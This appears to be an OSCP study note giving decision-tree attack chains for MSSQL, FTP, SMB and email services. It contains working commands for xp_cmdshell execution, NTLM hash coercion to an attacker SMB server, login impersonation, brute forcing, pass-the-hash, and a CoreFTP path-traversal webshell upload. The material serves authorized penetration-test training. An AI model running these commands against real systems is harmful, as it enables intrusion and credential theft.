# Service Attacks, Decision Tree

Part of [[DECISION TREE]]. "I have access to service X, what's the attack chain?" Covers MSSQL, FTP, SMB, and web services.

---

## MSSQL Attack Chain

### Got MSSQL credentials (or anonymous access) — what can I escalate to?

Work through this chain in order, each step unlocks the next if the simpler ones don't yield access:

**Step 1 — Get a client connected:**
```bash
# Linux
impacket-mssqlclient $Domain/$Username:$Password@$BoxIP   # Windows Auth: add -windows-auth
# Windows (on target)
sqlcmd -S $BoxIP -U $Username -P $Password    # use "go" to execute; -Q for one-liner
```

**Step 2 — Enumerate:**
```sql
SELECT name FROM master.dbo.sysdatabases;     -- list databases
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'dbo';  -- list tables
SELECT TOP 5 * FROM <table>;                  -- sample data
```

**Step 3 — Enable and run xp_cmdshell (if sysadmin):**
```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

**Step 4 — If xp_cmdshell is blocked: coerce an NTLM hash with xp_dirtree:**
```sql
EXECUTE master..xp_dirtree '\\$LocalIP\share', 1, 1;
```
Catch the hash with impacket-smbserver on Kali, then crack (hashcat -m 5600) or relay.
```bash
# Kali: before running the MSSQL command
sudo impacket-smbserver -smb2support share /tmp/share
```

**Step 5 — If you can't run commands: check for impersonation:**
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;           -- should now show 'sa'
EXECUTE xp_cmdshell 'whoami'; -- now try again as sa
```

**Step 6 — Check linked servers:**
```sql
SELECT srvname, isremote FROM master..sysservers;
EXECUTE ('SELECT SYSTEM_USER') AT [<linked-server-name>];
-- Nested '' escaping for quotes inside AT block:
EXECUTE ('EXECUTE (''xp_cmdshell ''''whoami'''''') AT [INNER_SERVER]') AT [OUTER_SERVER];
```

→ Full reference: [[06. Information Gathering|CS.6]] through [[06. Information Gathering|CS.9]]

---

## FTP Attack Chain

### Got FTP access — what to do

**Step 1 — Try anonymous first:**
```bash
ftp $BoxIP      # username: anonymous, password: (blank or any email)
```
Once in: `ls -la` to list (hidden files too), `prompt` to disable per-file confirmation, `mget *` to grab everything.

**Step 2 — Check for write access to web root:**
```bash
# Check if FTP root overlaps with web root
put test.txt        # from ftp session
curl http://$BoxIP/test.txt    # verify from Kali
```
If writable: upload a webshell to gain code execution.

**Step 3 — If no anonymous access: brute force (slow, -t 1):**
```bash
hydra -l $Username -P /usr/share/wordlists/rockyou.txt ftp://$BoxIP -t 1
```

**Step 4 — Check for known CVEs:**
→ ProFTPd 1.3.5: `mod_copy` module allows unauthenticated file copy (`SITE CPFR`/`SITE CPTO`)
→ CoreFTP 725: directory traversal via PUT request, see below

---

### CoreFTP Server ≤ build 725 — directory traversal via HTTP PUT (CVE-2022-22836)

Allows writing arbitrary files outside the FTP root via the HTTP interface (default port 443):
```bash
curl -k -X PUT -H 'Content-Type: application/x-www-form-urlencoded' \
  --path-as-is "https://$BoxIP:443/<traversal>" \
  -d @webshell.php
```
`<traversal>` example: `/../../../../../../xampp/htdocs/webshell.php` (adapt depth and web root to target).
`--path-as-is` is critical, without it curl normalises the `../` sequences away before sending.

→ Full reference: [[06. Information Gathering|CS.3]]

---

## SMB Attack Chain

### Got SMB access — enumeration first, then exploit

**Step 1 — Null session check:**
```bash
smbclient -N -L //$BoxIP          # -N = no password
enum4linux -A $BoxIP              # full auto-enum: shares, users, groups, OS
rpcclient -U "" -N $BoxIP         # null session for manual RPC queries
```

**Step 2 — Access shares:**
```bash
smbclient //$BoxIP/<share> -N     # anonymous
smbclient //$BoxIP/<share> -U $Username%$Password
# Inside: prompt (disable per-file prompt), mget * (grab all), put file.txt (test write access)
```

**Step 3 — If you have creds: check for PtH / relay opportunities:**
→ NTLM hash: try `impacket-psexec $Domain/$Username@$BoxIP --hashes :$AdminHash` (needs local admin)
→ Net-NTLMv2: relay with ntlmrelayx rather than crack if rockyou fails
→ See [[Secrets & Credentials (Decision Tree)#Got a hash from a Windows machine -- what type is it and what can you do?|hash type guide]]

**Step 4 — Check write access to shares containing scripts/binaries:**
→ Write a malicious script that calls back when executed by another user or service
→ Drop a `.lnk` or `.url` file pointing to `\\kali-ip\share`, any user browsing the share with Windows Explorer triggers an SMB auth (captured by Responder)

→ Full reference: [[06. Information Gathering|CS.13]]

---

## Email Service Attack Chain (SMTP + POP3)

### Got SMTP — enumerate users, then try to send

```bash
# User enumeration — RCPT TO method (most reliable, works when VRFY is blocked)
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -D $Domain -t $BoxIP

# Brute force SMTP auth (email-format username)
hydra -l user@domain.com -P /usr/share/wordlists/rockyou.txt smtp://$BoxIP
```

### Got POP3 credentials — retrieve emails manually

```bash
nc -nv $BoxIP 110     # or telnet $BoxIP 110
USER $Username
PASS $Password
LIST                    # list messages (N bytes each)
RETR 1                  # read message 1
QUIT
```
→ Emails often contain credentials, internal hostnames, or attachment leads, always read them.
→ Full reference: [[06. Information Gathering|CS.1]], [[06. Information Gathering|CS.2]]

#### Tags: #DecisionTree #ServiceAttacks #MSSQL #FTP #SMB #SMTP #POP3 #CoreFTP #xpdirtree #Impersonation #LinkedServer
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for transformations
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[MODULES/17. Windows Privilege Escalation]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
